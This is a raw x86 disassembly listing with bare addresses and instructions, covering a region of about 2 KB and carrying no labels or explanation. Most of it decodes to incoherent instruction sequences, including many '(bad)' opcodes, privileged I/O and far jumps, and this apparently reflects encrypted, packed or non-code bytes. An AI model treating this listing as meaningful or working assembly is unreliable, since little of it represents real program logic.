  412f8b:	aas    
  412f8c:	mov    ds:0x31fdc55,eax
  412f91:	jge    0x41300f
  412f93:	nop
  412f94:	mov    ecx,0x9fdcf192
  412f99:	rol    bl,1
  412f9b:	xor    bh,al
  412f9d:	push   esp
  412f9e:	leave  
  412f9f:	add    al,BYTE PTR [ecx]
  412fa1:	push   eax
  412fa2:	rep ins BYTE PTR es:[edi],dx
  412fa4:	sbb    bl,cl
  412fa6:	add    BYTE PTR [edx],al
  412fa8:	xchg   edi,eax
  412fa9:	pop    ecx
  412faa:	lods   al,BYTE PTR ds:[esi]
  412fab:	mov    al,0x97
  412fad:	data16 cmp ah,dh
  412fb0:	mov    ecx,edi
  412fb2:	lods   al,BYTE PTR ds:[esi]
  412fb3:	aaa    
  412fb4:	push   ebp
  412fb5:	pusha  
  412fb6:	popa   
  412fb7:	mov    edi,0x232b6bd
  412fbc:	mov    ds:0x1d8e0fd6,al
  412fc1:	fidivr DWORD PTR [ebp+0x74]
  412fc4:	repnz ss fs leave 
  412fc8:	inc    edx
  412fc9:	mov    ds:0x976b4aae,eax
  412fce:	fwait
  412fcf:	ds icebp 
  412fd1:	mov    ebx,0x993911e8
  412fd6:	lods   al,BYTE PTR ds:[esi]
  412fd7:	sbb    bh,BYTE PTR [edi-0x45]
  412fda:	sub    dl,BYTE PTR ds:0x75d9da23
  412fe0:	jne    0x412ff8
  412fe2:	fucom  st(4)
  412fe4:	daa    
  412fe5:	xor    ecx,DWORD PTR [edx]
  412fe7:	cmp    esi,DWORD PTR [ebp-0x12]
  412fea:	cmp    ch,BYTE PTR [ebp+0x17582384]
  412ff0:	mov    dl,0xf5
  412ff2:	daa    
  412ff3:	and    al,0xca
  412ff5:	add    al,0x35
  412ff7:	cmp    bl,ch
  412ff9:	ficomp WORD PTR [ecx+0x699b3e83]
  412fff:	push   esi
  413000:	push   esi
  413001:	imul   esi,esi,0xb8514b8c
  413007:	stc    
  413008:	fldenv [edx+0x38945f07]
  41300e:	sti    
  41300f:	daa    
  413010:	lea    eax,[edx-0x2c769dd8]
  413016:	add    al,BYTE PTR ds:0x46f69dc0
  41301c:	int3   
  41301d:	mov    dh,0x74
  41301f:	push   ebp
  413020:	je     0x413050
  413022:	in     eax,dx
  413023:	mov    WORD PTR [edx+eiz*4-0x28],gs
  413027:	mov    BYTE PTR [esi+0x40ec5ab5],dh
  41302d:	cld    
  41302e:	pop    ds
  41302f:	stos   DWORD PTR es:[edi],eax
  413030:	ins    BYTE PTR es:[edi],dx
  413031:	xchg   edx,eax
  413032:	rol    DWORD PTR [edx],0x1b
  413035:	sbb    DWORD PTR [edi],0xffffffd3
  413038:	rol    ch,0xde
  41303b:	fisub  WORD PTR [eax+0x45]
  41303e:	pop    ebp
  41303f:	(bad)  
  413041:	cmp    ebp,ecx
  413043:	xor    DWORD PTR ss:[ebp+0xf],edi
  413047:	inc    edx
  413048:	fwait
  413049:	out    dx,eax
  41304a:	sti    
  41304b:	sub    bh,BYTE PTR [ebx+eax*8]
  41304e:	mov    edx,0xd21ad0e2
  413053:	int    0x68
  413055:	neg    DWORD PTR [ebx-0x49cb640]
  41305b:	call   0x1542:0x2e77fe11
  413062:	sbb    edx,DWORD PTR [edi+0x77]
  413065:	and    DWORD PTR [ebx-0x50],eax
  413068:	neg    BYTE PTR [edi+ecx*1+0x43afcdda]
  41306f:	(bad)  
  413071:	pop    ebx
  413072:	in     al,0xad
  413074:	mov    eax,0xab847cd3
  413079:	mov    ebp,0x8c16f3a1
  41307e:	mov    edx,0x9e19ae09
  413083:	and    al,BYTE PTR [esi+edx*4+0x3f]
  413087:	sar    ch,0x62
  41308a:	pop    ss
  41308b:	lahf   
  41308c:	imul   eax,DWORD PTR [ecx+ebp*1-0x48],0x45
  413091:	lods   al,BYTE PTR ds:[esi]
  413092:	and    eax,0x34b4c1ac
  413097:	mov    al,0x72
  413099:	jmp    0x3476:0xf8fa7c02
  4130a0:	(bad)  
  4130a1:	sbb    al,BYTE PTR [edx]
  4130a3:	mov    dl,0x34
  4130a5:	mov    ds:0x828449b8,al
  4130aa:	fimul  DWORD PTR [edi-0x53ef292e]
  4130b0:	or     eax,0xcde14034
  4130b5:	or     eax,0x8eb6a744
  4130ba:	xchg   ecx,eax
  4130bb:	add    eax,0x74c64779
  4130c0:	add    eax,0x3088d8d7
  4130c5:	mov    ecx,0x2717eade
  4130ca:	out    dx,al
  4130cb:	adc    eax,0xc14ffdbf
  4130d0:	xchg   esi,eax
  4130d1:	adc    DWORD PTR [esi+0x34],ebx
  4130d4:	inc    edi
  4130d6:	sub    dh,al
  4130d8:	sbb    dh,BYTE PTR [esi]
  4130da:	mov    esp,0x87887f56
  4130df:	xchg   al,al
  4130e1:	lds    esi,FWORD PTR [ecx-0x59c461a5]
  4130e7:	sti    
  4130e8:	xlat   BYTE PTR ds:[ebx]
  4130e9:	xchg   dl,dl
  4130eb:	hlt    
  4130ec:	xchg   esi,eax
  4130ed:	loop   0x413071
  4130ef:	add    dh,BYTE PTR ds:0x6319ab7
  4130f5:	fadd   st,st(6)
  4130f7:	jne    0x41310c
  4130f9:	dec    ebp
  4130fa:	jl     0x41310a
  4130fc:	and    al,0x75
  4130fe:	aam    0x74
  413100:	jno    0x4130d7
  413102:	(bad)  
  413103:	rcr    BYTE PTR [ebx],1
  413105:	push   0xffffffa5
  413107:	add    bl,ah
  413109:	retf   
  41310a:	imul   ebp,DWORD PTR [edi-0x75],0xb0b969c5
  413111:	iret   
  413112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413113:	outs   dx,BYTE PTR ds:[esi]
  413114:	div    DWORD PTR [ebp+0x69]
  413117:	test   BYTE PTR [edi+0x738df7ca],0xd8
  41311e:	sub    eax,DWORD PTR [esi+0x13]
  413121:	loope  0x41312f
  413123:	fadd   st(0),st
  413125:	pop    ds
  413126:	mov    eax,0x9cba275f
  41312b:	leave  
  41312c:	jne    0x4130e0
  41312e:	fcmovbe st,st(7)
  413131:	data16 fs mov bl,0x3e
  413135:	xlat   BYTE PTR ds:[ebx]
  413136:	push   ds
  413137:	inc    edi
  413138:	clc    
  413139:	push   edi
  41313a:	pop    ecx
  41313b:	sbb    BYTE PTR [eax],ch
  41313d:	(bad)  
  41313e:	out    dx,eax
  41313f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413140:	pop    esp
  413141:	mov    dh,0x53
  413143:	sub    BYTE PTR [edi+ebp*1+0x7589577e],al
  41314a:	fmul   DWORD PTR [ecx+0x7589d475]
  413150:	in     al,dx
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fd79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e1a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	cmp    bl,BYTE PTR [edx+0x61a3d1b1]
  413184:	jo     0x4131f6
  413186:	mov    ecx,0x9170707e
  41318b:	(bad)  
  41318c:	mov    ds:0x540bfa71,al
  413191:	mov    bh,BYTE PTR [edi]
  413193:	adc    al,0x1d
  413195:	fcmovb st,st(6)
  413197:	dec    edi
  413198:	xor    al,0xf1
  41319a:	mov    bl,BYTE PTR [esi]
  41319c:	mov    edx,0x773441bb
  4131a1:	inc    ebx
  4131a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a4:	or     BYTE PTR [esi+0x77b1aa59],ch
  4131aa:	clc    
  4131ab:	mov    edi,0x9e51ceea
  4131b0:	repz cmp al,0xbc
  4131b3:	cmp    ebx,DWORD PTR [ebx-0x58]
  4131b6:	test   eax,0x940d23a9
  4131bb:	jecxz  0x4131fd
  4131bd:	adc    bl,bh
  4131bf:	add    edi,eax
  4131c1:	inc    edi
  4131c2:	in     al,0x24
  4131c4:	jecxz  0x413167
  4131c6:	test   eax,0xd40e22bc
  4131cb:	mov    bl,0xf
  4131cd:	in     eax,0xe3
  4131cf:	loopne 0x41322c
  4131d1:	pop    ebx
  4131d2:	fisttp QWORD PTR [ebx+esi*4-0x25]
  4131d6:	sub    al,0xb8
  4131d8:	sub    al,0x7e
  4131da:	imul   DWORD PTR [esi]
  4131dc:	fxch   st(4)
  4131de:	int    0x3f
  4131e0:	xor    eax,0x323457b6
  4131e5:	dec    ebp
  4131e6:	in     al,dx
  4131e7:	and    ch,BYTE PTR [ecx+0x12]
  4131ea:	pop    ss
  4131eb:	add    bh,BYTE PTR [ebx+0x49]
  4131ee:	in     al,dx
  4131ef:	(bad)  
  4131f0:	fwait
  4131f1:	adc    DWORD PTR [edi],ebp
  4131f3:	or     DWORD PTR [esi],ecx
  4131f5:	aas    
  4131f6:	pop    ss
  4131f7:	sub    DWORD PTR [eax+0x2f6505dd],edx
  4131fd:	cli    
  4131fe:	(bad)  
  4131ff:	jle    0x41322f
  413201:	(bad)  
  413202:	and    eax,0xa11e76d
  413207:	sar    bh,1
  413209:	ins    BYTE PTR es:[edi],dx
  41320a:	push   0xffffffee
  41320c:	ins    DWORD PTR es:[edi],dx
  41320d:	les    ebx,FWORD PTR ds:0x7a5c2d5d
  413213:	in     eax,0xd
  413215:	inc    ebp
  413216:	ins    DWORD PTR es:[edi],dx
  413217:	lock mov ecx,0x41979705
  41321d:	jmp    0x84dff6eb
  413222:	jae    0x413209
  413224:	jae    0x41329b
  413226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413227:	push   eax
  413228:	inc    ebp
  413229:	call   FWORD PTR [esi+edx*8+0x247ab6f7]
  413230:	lock xor ah,BYTE PTR [ebx+0x49]
  413234:	mov    ebx,0x3abce14e
  413239:	addr16 fwait
  41323b:	dec    ebp
  41323c:	adc    cl,bl
  41323e:	add    dh,BYTE PTR [esi-0x15fc7f07]
  413244:	cdq    
  413245:	or     DWORD PTR [edx+0x8b63f5b],0x27e668b9
  41324f:	mov    esi,0x1d2b1650
  413254:	jle    0x413210
  413256:	cmc    
  413257:	xchg   ebp,eax
  413258:	stos   BYTE PTR es:[edi],al
  413259:	and    ebp,eax
  41325b:	imul   eax,DWORD PTR [eax-0x3804dd5],0xfffffffe
  413262:	or     BYTE PTR fs:[ecx],ah
  413265:	inc    eax
  413266:	sahf   
  413267:	inc    ecx
  413268:	mov    eax,DWORD PTR [edi+0x20]
  41326b:	inc    edi
  41326c:	(bad)  
  41326d:	repz std 
  41326f:	into   
  413270:	(bad)  
  413272:	sub    BYTE PTR [ebp+0x9],cl
  413275:	jns    0x4132c7
  413277:	inc    esp
  413278:	xchg   BYTE PTR [edi],ah
  41327a:	call   0xb405:0x2f4b01d0
  413281:	sbb    bl,BYTE PTR [eax+0x214da13c]
  413287:	mov    dh,0xfb
  413289:	add    ecx,DWORD PTR [bp+0x7b36]
  41328e:	(bad)  
  41328f:	sbb    bh,BYTE PTR [eax+0x43208e38]
  413295:	push   esp
  413296:	(bad)  
  413297:	aam    0x1c
  413299:	mov    al,0xe7
  41329b:	jmp    0xf72e:0xee459a53
  4132a2:	je     0x413229
  4132a4:	imul   edi,DWORD PTR [ecx],0xfffffff2
  4132a7:	shl    BYTE PTR [ecx],cl
  4132a9:	arpl   WORD PTR [ebx],bp
  4132ab:	lods   al,BYTE PTR ds:[esi]
  4132ac:	cmc    
  4132ad:	mov    esp,0x73dbafa4
  4132b2:	int    0x4
  4132b4:	pop    es
  4132b5:	inc    edi
  4132b6:	lock test DWORD PTR [esi+0x3748c18a],edi
  4132bd:	xchg   ecx,eax
  4132be:	cmp    BYTE PTR [ebx+esi*4+0x47],bh
  4132c2:	jbe    0x4132b3
  4132c4:	fidivr WORD PTR [edi-0x4bd61011]
  4132ca:	jmp    0x2668:0x4b5f36f9
  4132d1:	std    
  4132d2:	xchg   esp,eax
  4132d3:	loopne 0x413283
  4132d5:	and    ah,bl
  4132d7:	cli    
  4132d8:	inc    edx
  4132d9:	mov    eax,ds:0x7a870357
  4132de:	push   0xe504c459
  4132e3:	mov    esi,0x1be0f384
  4132e8:	idiv   BYTE PTR [ebx]
  4132ea:	push   esi
  4132eb:	xchg   esi,eax
  4132ec:	mov    cl,0xdc
  4132ee:	inc    esi
  4132ef:	mov    esi,0xe4183360
  4132f4:	jecxz  0x413309
  4132f6:	mov    dh,0xa2
  4132f8:	add    edx,DWORD PTR [edi+edx*2-0x65]
  4132fc:	jg     0x4132fa
  4132fe:	and    eax,0x39f31ce3
  413303:	or     al,0xf2
  413305:	hlt    
  413306:	nop
  413307:	cmp    DWORD PTR [eax],edi
  413309:	and    al,0x0
  41330b:	fild   DWORD PTR [edi+0x7a5dda28]
  413311:	add    al,0x63
  413313:	int3   
  413314:	idiv   DWORD PTR [ebp-0x4ed0c996]
  41331a:	enter  0xfde0,0xc3
  41331e:	cs fucomip st,st(1)
  413321:	mov    bl,BYTE PTR [edi-0x57d0b2f7]
  413327:	rcr    DWORD PTR [ecx+edi*1-0x44a8f429],cl
  41332e:	sbb    BYTE PTR [ecx+0x5b120158],ah
  413334:	mov    WORD PTR [ecx],?
  413336:	mov    ds:0xe9d73c72,eax
  41333b:	sbb    al,0x93
  41333d:	(bad)  
  41333e:	nop
  41333f:	mov    ebx,0xdc2dd542
  413344:	and    BYTE PTR [edi-0x22],ah
  413347:	mov    dh,0xef
  413349:	pop    eax
  41334a:	psraw  mm5,QWORD PTR [eax]
  41334d:	retf   
  41334e:	popa   
  41334f:	cmp    bh,BYTE PTR [ecx+0x6daa138c]
  413355:	sub    bh,0x2e
  413358:	push   ebx
  413359:	iret   
  41335a:	mov    ch,0x3e
  41335c:	out    dx,eax
  41335d:	mov    ds:0xdcb44343,eax
  413362:	add    BYTE PTR [edi+0x756a5ada],0x44
  413369:	xchg   ebx,eax
  41336a:	push   0xc21460b4
  41336f:	sbb    ecx,DWORD PTR [ebx-0x478ca5d3]
  413375:	add    DWORD PTR ds:0xaef53dfd,eax
  41337b:	(bad)  [ebp-0x6d1a28ce]
  413381:	inc    eax
  413382:	fwait
  413383:	iret   
  413384:	pop    ds
  413385:	popa   
  413386:	sub    al,0x5f
  413388:	xchg   edi,eax
  413389:	xchg   ebx,eax
  41338a:	in     eax,dx
  41338b:	and    al,BYTE PTR [edx+0x12]
  41338e:	test   dl,dl
  413390:	add    DWORD PTR [esi-0x26],ebx
  413393:	rcl    BYTE PTR [ebx+0x1c334e3c],0x96
  41339a:	push   eax
  41339b:	(bad)  
  41339c:	or     eax,0x7f11dc0c
  4133a1:	inc    edi
  4133a2:	mov    esi,0x7e389eec
  4133a7:	clc    
  4133a8:	mov    al,0xc
  4133aa:	push   ds
  4133ab:	js     0x41337b
  4133ad:	lock sub BYTE PTR [esp+edi*2-0xab07f4f],cl
  4133b5:	or     eax,ebp
  4133b7:	mov    DWORD PTR [edx-0xf0eddad],0x4725c508
  4133c1:	xchg   edx,eax
  4133c2:	jnp    0x41337d
  4133c4:	xchg   ecx,eax
  4133c5:	arpl   dx,dx
  4133c7:	sub    bh,dh
  4133c9:	jnp    0x4133f6
  4133cb:	sbb    ecx,edi
  4133cd:	std    
  4133ce:	pop    es
  4133cf:	xchg   ebp,eax
  4133d0:	dec    ebx
  4133d1:	imul   edi,DWORD PTR [ebx],0xffffff87
  4133d4:	xchg   ecx,eax
  4133d5:	idiv   BYTE PTR [ebx+0x11]
  4133d8:	lods   al,BYTE PTR ds:[si]
  4133da:	inc    esp
  4133db:	sub    BYTE PTR [ecx+edi*2+0x214ef734],al
  4133e2:	and    dl,BYTE PTR [ebx+0x78137dff]
  4133e8:	mov    edx,0xa0499ed1
  4133ed:	sbb    BYTE PTR [edi+0x1321f9bb],0x6b
  4133f4:	aad    0x99
  4133f6:	sub    esp,DWORD PTR [edx-0x34f939a1]
  4133fc:	pop    ds
  4133fd:	out    0xc3,eax
  4133ff:	and    ebx,DWORD PTR cs:[esi]
  413402:	sub    DWORD PTR [ebp+0x381958d],0x48
  413409:	fs jno 0x413394
  41340c:	push   cs
  41340d:	jne    0x4133bb
  41340f:	xchg   edx,eax
  413410:	jg     0x413468
  413412:	(bad)  
  413413:	hlt    
  413414:	pop    edi
  413415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413416:	push   ecx
  413417:	pop    eax
  413418:	daa    
  413419:	mov    bl,0xb7
  41341b:	adc    eax,esi
  41341d:	sub    al,0x2e
  41341f:	in     al,0x6c
  413421:	jmp    0x413408
  413423:	mov    ebx,0x34f0e039
  413428:	(bad)  
  413429:	ror    DWORD PTR [esi],cl
  41342b:	test   BYTE PTR [edx],bl
  41342d:	ror    DWORD PTR [edi],cl
  41342f:	icebp  
  413430:	scas   eax,DWORD PTR es:[edi]
  413431:	and    eax,0x757bb877
  413436:	sub    DWORD PTR [ecx+0x21],esp
  413439:	ins    BYTE PTR es:[edi],dx
  41343a:	scas   al,BYTE PTR es:[edi]
  41343b:	push   edx
  41343c:	lods   al,BYTE PTR ds:[esi]
  41343d:	retf   
  41343e:	(bad)  
  41343f:	mov    eax,ds:0x1f1c90a5
  413444:	fistp  WORD PTR [esi+0x1]
  413447:	ret    
  413448:	icebp  
  413449:	sub    edx,eax
  41344b:	push   edi
  41344c:	inc    esi
  41344d:	mov    dl,0xa8
  41344f:	adc    ebx,DWORD PTR [edi+0x3]
  413452:	retf   
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fd79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fd55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xf106570f,al
  413492:	sbb    ebp,esp
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xaa70707e
  41349c:	push   0x7c676358
  4134a1:	push   edx
  4134a2:	icebp  
  4134a3:	or     DWORD PTR [ecx+0x4c],edx
  4134a6:	sub    cl,0x3b
  4134a9:	into   
  4134aa:	mov    al,0xd9
  4134ac:	xchg   DWORD PTR es:[ebx-0x4c6f827d],eax
  4134b3:	loop   0x413436
  4134b5:	idiv   BYTE PTR [esi]
  4134b7:	adc    DWORD PTR [ebx*2-0x5293d41f],ecx
  4134be:	xchg   ebx,eax
  4134bf:	dec    eax
  4134c0:	pop    ds
  4134c1:	idiv   DWORD PTR [edx+0x517ea4a3]
  4134c7:	jae    0x413515
  4134c9:	jne    0x4134b4
  4134cb:	adc    esi,DWORD PTR [edi+0x7]
  4134ce:	add    eax,ebx
  4134d0:	pop    ss
  4134d1:	mov    DWORD PTR ds:0x13075ee6,edi
  4134d7:	sub    edi,DWORD PTR [ebp+0x5553f925]
  4134dd:	mov    edi,0xd404a600
  4134e2:	inc    edi
  4134e3:	imul   edx,DWORD PTR [esi-0x7a],0x53
  4134e7:	sbb    ch,al
  4134e9:	lods   eax,DWORD PTR ds:[esi]
  4134ea:	inc    edi
  4134eb:	xchg   esp,eax
  4134ec:	sub    esi,DWORD PTR [edx]
  4134ee:	jae    0x413486
  4134f0:	ds jb  0x413535
  4134f3:	adc    dh,BYTE PTR [ebx]
  4134f5:	dec    eax
  4134f6:	mov    ecx,0xb98b40d1
  4134fb:	or     esp,edx
  4134fd:	jmp    0x7e1f:0xb9506db0
  413504:	(bad)  
  413505:	fsubr  DWORD PTR [esi]
  413507:	inc    ecx
  413508:	inc    esi
  413509:	repnz sti 
  41350b:	(bad)  
  41350d:	stos   DWORD PTR es:[edi],eax
  41350e:	add    eax,DWORD PTR [ecx+edx*1-0x78a8b051]
  413515:	or     ebx,DWORD PTR [edx+0x2b7308d6]
  41351b:	fbstp  TBYTE PTR [edx+0x5a]
  41351e:	in     al,0x2d
  413520:	mov    al,ds:0xdc73ac51
  413525:	jl     0x413579
  413527:	cli    
  413528:	sti    
  413529:	pop    esi
  41352a:	ret    
  41352b:	inc    edi
  41352c:	cmp    ebx,DWORD PTR [ecx+0x2c]
  41352f:	scas   al,BYTE PTR es:[edi]
  413530:	stc    
  413531:	sbb    BYTE PTR [ecx],0xe1
  413534:	dec    esp
  413535:	xchg   esp,eax
  413536:	xor    ah,BYTE PTR [ebx+eiz*4]
  413539:	leave  
  41353a:	sub    cl,BYTE PTR [ecx]
  41353c:	stos   DWORD PTR es:[edi],eax
  41353d:	push   ss
  41353e:	xlat   BYTE PTR ds:[ebx]
  41353f:	imul   DWORD PTR [esi-0x7b]
  413542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413543:	push   ds
  413544:	icebp  
  413545:	mov    esi,0x78488ba8
  41354a:	sub    esp,0x1f1463ef
  413550:	ret    
  413551:	sub    ah,BYTE PTR [edi]
  413553:	jns    0x413549
  413555:	dec    ebx
  413556:	inc    ebp
  413557:	mov    ecx,0xfdddc412
  41355c:	push   edi
  41355d:	(bad)  
  41355e:	in     al,dx
  41355f:	dec    ecx
  413560:	cli    
  413561:	xor    DWORD PTR [eax+ebx*4+0x4e260a1a],ebp
  413568:	pop    ecx
  413569:	fcmovnb st,st(7)
  41356b:	loop   0x4134f3
  41356d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41356e:	cmp    eax,0x7633ed88
  413573:	fcomp  st(5)
  413575:	sbb    dl,BYTE PTR [edx+0x6f4ba80]
  41357b:	lods   eax,DWORD PTR ds:[esi]
  41357c:	ja     0x4135a7
  41357e:	cmp    ebp,esi
  413580:	pop    es
  413581:	or     eax,0xe4a4af1
  413586:	adc    esp,ecx
  413588:	inc    eax
  413589:	cmp    eax,0x466c584a
  41358e:	mov    WORD PTR [ecx+ebx*1-0xc705c34],es
  413595:	mov    BYTE PTR [eax-0x4b178317],bl
  41359b:	jae    0x413536
  41359d:	sbb    esp,DWORD PTR [edx-0x1c]
  4135a0:	cmp    ebp,DWORD PTR [esi+0xd7aa887]
  4135a6:	gs push ecx
  4135a8:	sub    bl,BYTE PTR ds:0xd6b6c146
  4135ae:	inc    ebx
  4135af:	mov    BYTE PTR [esi],bh
  4135b1:	pusha  
  4135b2:	push   ds
  4135b3:	les    ecx,FWORD PTR [esi-0x2c65dc73]
  4135b9:	test   esi,0x65bb7634
  4135bf:	iret   
  4135c0:	xor    al,bl
  4135c2:	out    dx,eax
  4135c3:	repnz xchg esi,eax
  4135c5:	pop    ds
  4135c6:	nop
  4135c7:	xchg   DWORD PTR [ebx-0x1fda0a6e],esi
  4135cd:	jl     0x41361a
  4135cf:	retf   
  4135d0:	push   esp
  4135d1:	or     eax,0x7f1a9df5
  4135d6:	inc    edi
  4135d7:	jo     0x413566
  4135d9:	inc    esi
  4135da:	fstp   TBYTE PTR [edi]
  4135dc:	pop    ss
  4135dd:	inc    edi
  4135de:	mov    eax,0x55169196
  4135e3:	xor    al,0x53
  4135e5:	dec    esi
  4135e7:	scas   al,BYTE PTR es:[edi]
  4135e8:	dec    edi
  4135e9:	jb     0x413602
  4135eb:	cld    
  4135ec:	push   cs
  4135ed:	shl    BYTE PTR [esi],cl
  4135ef:	xchg   ecx,eax
  4135f0:	xor    al,0x26
  4135f2:	ja     0x41359a
  4135f4:	push   esi
  4135f5:	mov    edi,0x653aa9c2
  4135fa:	rcl    eax,0x48
  4135fd:	sbb    esi,edx
  4135ff:	mov    al,0x2c
  413601:	and    DWORD PTR [ecx-0x955d880],edi
  413607:	mov    BYTE PTR [ecx-0x14619da1],al
  41360d:	dec    ebp
  41360e:	cmp    edi,esi
  413610:	inc    ebx
  413611:	mov    ebx,0xc9627347
  413616:	fs jbe 0x4135f2
  413619:	xchg   ebp,eax
  41361a:	pop    ds
  41361b:	mov    DWORD PTR [edi+eiz*1+0x8348dd8],esp
  413622:	leave  
  413623:	in     eax,0xee
  413625:	mov    al,0x31
  413627:	je     0x413676
  413629:	sub    al,0x77
  41362b:	mov    eax,0xad16a814
  413630:	sbb    esp,0xe9d6f49f
  413636:	test   edi,ebp
  413638:	in     eax,0xf9
  41363a:	lods   al,BYTE PTR ds:[esi]
  41363b:	sti    
  41363c:	cdq    
  41363d:	retf   
  41363e:	jb     0x4135fd
  413640:	mov    esp,0xedc68e73
  413645:	jo     0x41367b
  413647:	xchg   ebx,eax
  413648:	cmp    eax,0x456a092b
  41364d:	cmc    
  41364e:	add    bl,BYTE PTR [edi]
  413650:	push   ebp
  413651:	call   0x1a4b:0xcfe0bd81
  413658:	cmp    DWORD PTR [ebx+0x69e6adc1],ebp
  41365e:	inc    edx
  41365f:	ss inc eax
  413661:	(bad)  
  413662:	icebp  
  413663:	dec    ecx
  413664:	fwait
  413665:	jnp    0x4136dc
  413667:	idiv   BYTE PTR [ecx+ecx*1+0x14bef844]
  41366e:	dec    esp
  41366f:	cli    
  413670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413671:	jmp    0x616b:0xd10291b8
  413678:	div    BYTE PTR [esi+0x1c266ad7]
  41367e:	push   0x34b8b1e1
  413683:	cdq    
  413684:	xchg   ebx,eax
  413685:	lods   eax,DWORD PTR ds:[esi]
  413686:	pop    ecx
  413687:	mov    ?,WORD PTR [ebx+0xd364d07]
  41368d:	clc    
  41368e:	add    eax,0x3a52539b
  413693:	jns    0x4136a8
  413695:	daa    
  413696:	inc    ebx
  413697:	cld    
  413698:	ror    edi,cl
  41369a:	and    ch,cl
  41369c:	test   eax,0xad592d4b
  4136a1:	jnp    0x41363d
  4136a3:	mov    eax,ds:0xc5b2158e
  4136a8:	push   0x44
  4136aa:	pop    edx
  4136ab:	scas   eax,DWORD PTR es:[edi]
  4136ac:	xor    cl,BYTE PTR [edi]
  4136ae:	xchg   ebp,eax
  4136af:	in     eax,dx
  4136b0:	mov    ebp,0xd4fd97a3
  4136b5:	fidiv  DWORD PTR ds:0xf6e5465d
  4136bb:	ss xchg ecx,eax
  4136bd:	push   edx
  4136be:	mov    DWORD PTR [esi+0x2a],ecx
  4136c1:	lods   eax,DWORD PTR ds:[esi]
  4136c2:	dec    esp
  4136c3:	sahf   
  4136c4:	mov    ds:0xfda0122f,eax
  4136c9:	xlat   BYTE PTR ds:[ebx]
  4136ca:	sbb    esp,DWORD PTR [ebx]
  4136cc:	into   
  4136cd:	push   esi
  4136ce:	jmp    0x2da9:0xdcaf682d
  4136d5:	pushf  
  4136d6:	inc    ecx
  4136d7:	xchg   edx,eax
  4136d8:	jns    0x413749
  4136da:	mov    gs,WORD PTR [bx+si-0x2894]
  4136df:	mov    dl,0x8f
  4136e1:	mov    eax,0x5fa5b4e6
  4136e6:	mov    esi,0x4217ed0a
  4136eb:	sub    eax,0x7c8a06fa
  4136f0:	pop    ebp
  4136f1:	rol    BYTE PTR [ebp+0x74],cl
  4136f4:	fild   WORD PTR [eax+ebp*4+0x24]
  4136f8:	mov    edx,0x6b71f022
  4136fd:	cmp    bl,BYTE PTR ds:0xd8bfdc33
  413703:	icebp  
  413704:	inc    BYTE PTR [eax-0x67]
  413707:	int    0x31
  413709:	or     esp,DWORD PTR [eax+0x538d44f1]
  41370f:	es or  ah,al
  413712:	stos   BYTE PTR es:[edi],al
  413713:	adc    bl,BYTE PTR [ecx]
  413715:	mov    cl,0x9
  413717:	mov    eax,ds:0x28cd451a
  41371c:	push   edx
  41371d:	loop   0x41375f
  41371f:	jmp    0xc456:0xd4598091
  413726:	jmp    0x413750
  413728:	ins    BYTE PTR es:[edi],dx
  413729:	push   esi
  41372a:	outs   dx,DWORD PTR ds:[esi]
  41372b:	mov    ds:0xece8900,eax
  413730:	dec    edx
  413731:	out    dx,eax
  413732:	jmp    0x45eb:0xedb054b7
  413739:	dec    esp
  41373a:	test   DWORD PTR [esp+edx*1],0x3f898ea5
  413741:	add    esi,DWORD PTR [edx+ecx*1-0x4aa160ba]
  413748:	ficomp WORD PTR [edx-0x42]
  41374b:	pop    ecx
  41374c:	jns    0x4137b6
  41374e:	shl    BYTE PTR [edx],0xdc
  413751:	stc    
  413752:	dec    eax
  413753:	adc    eax,0x2fa242e2
  413758:	mov    esi,0xaa31becc
  41375d:	jle    0x413715
  41375f:	jne    0x4137d7
  413761:	mov    BYTE PTR [ebx],bh
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	mov    WORD PTR [ecx+0x6b3533f3],es
  413784:	jo     0x4137f6
  413786:	mov    ecx,0x1f70707e
  41378b:	fidivr DWORD PTR [eax-0x57c1e561]
  413791:	jg     0x413715
  413793:	sbb    DWORD PTR [edi-0x40],esi
  413796:	push   ecx
  413797:	mov    edi,0x8849b4b3
  41379c:	inc    ebx
  41379d:	mov    esp,0x98b21008
  4137a2:	jp     0x41380e
  4137a4:	adc    cl,BYTE PTR [ebx+edx*1+0x53c25e5b]
  4137ab:	cmp    BYTE PTR [ecx],ah
  4137ad:	mov    eax,0x4c1436dc
  4137b2:	ins    DWORD PTR es:[edi],dx
  4137b3:	pop    ebp
  4137b4:	add    al,0xb0
  4137b6:	mov    ah,0x6
  4137b8:	rcl    DWORD PTR [esi+ebx*2],cl
  4137bb:	imul   edi,DWORD PTR [eax+0x70999d5f],0x285b2f58
  4137c5:	jno    0x413755
  4137c7:	into   
